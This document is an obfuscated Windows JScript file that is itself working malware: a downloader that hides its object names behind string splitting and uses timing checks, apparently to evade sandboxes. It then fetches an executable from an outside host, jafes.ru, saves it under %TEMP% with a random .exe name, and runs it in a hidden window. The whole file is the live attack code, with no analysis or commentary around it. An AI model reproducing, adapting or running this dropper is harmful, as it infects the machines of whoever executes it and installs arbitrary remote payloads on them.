var NP = false;
var VM = "Create"+"Object";
var K = function Z() {return WScript[VM]("WScript"+".Shell");}(), L = 11;
var S = "MSXML2"+".XMLHTTP";
var M = 2;
var V = M - 2;
function B(E0){K["Run"](E0, V, V);};
function Y(){return S + "";};
function N(KS0, W){V = V * 1; return KS0 - W;};
function FW(){return VM;};
/*@cc_on
  @if (@_win32 || @_win64)
    NP = true;
  @end
@*/
if (NP)
{
var FO = "";
function J(){return 22;};
var ZE = 0; var C = 0;
function T0()
{
var XC = new this["Date"]();
var E = XC["getUTCMilliseconds"]();
WScript["Sleep"](J());
var XC = new this["Date"]();
var YY = XC["getUTCMilliseconds"]();
WScript["Sleep"](J());
var XC = new this["Date"]();
var GK = XC["getUTCMilliseconds"]();
var ZE = "RT";
ZE = N(YY, E);
var C = "TN";
C = N(GK, YY);
FO = "open";
return N(ZE, C);
}
var B0 = false;
var O = false;
for (var PI = V; PI < J() * 1; PI++){if (T0() != V){
B0 = true; 
C = "31" + 11 * ZE + C; 
O = true; 
break;
}}
function F() {return ((B0 == true) && (B0 == O)) ? 1 : V;};
if (B0 && F() && O){
function HQ() {return K["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Ie9o9BjuAPFe4.ex" + "e";};
 H = Y();
 WN = WScript[VM](H);
 var QZ = 1;
do { 
	for (;QZ;){
	try {
		if (QZ == 1)
		{
			WN[FO]("GET", "http://jafes.ru/b0ros", false);
			WN["send"]();
			BC = "Sleep";
			QZ = 2;
		}
		WScript[BC](J() + 120); 
		if (WN["readystate"] < 2 * 2) continue;
		QZ = V;
		function T(LT) {var KS = (1, 2, 3, 4, 5, LT); return KS;};
		Y0 = WScript[FW()]("ADODB.Stream");
		H = Y0;
		H[FO]();
		H["type"] = T(1);
		H["write"](WN["ResponseBody"]);
		Y0["position"] = T(V);
		H["Save" + "ToFile"](HQ(), 2);
		Y0["cl"+"ose"]();
		Q = HQ();
		B(Q);
	} catch(PI0){};};
}while (QZ);
}
}

